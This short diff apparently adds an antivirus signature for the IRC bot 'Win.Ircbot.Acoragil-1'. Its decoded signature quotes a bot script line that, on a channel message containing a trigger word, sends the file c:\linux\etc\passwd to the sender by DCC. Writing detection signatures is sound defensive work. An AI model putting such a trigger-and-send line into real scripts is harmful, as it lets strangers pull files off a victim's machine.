@@ -1,0 +1,6 @@
+VIRUS NAME: Win.Ircbot.Acoragil-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+n3=ON 1:TEXT:*shirac*:#:/dcc send $nick c:\linux\etc\passwd.
+n
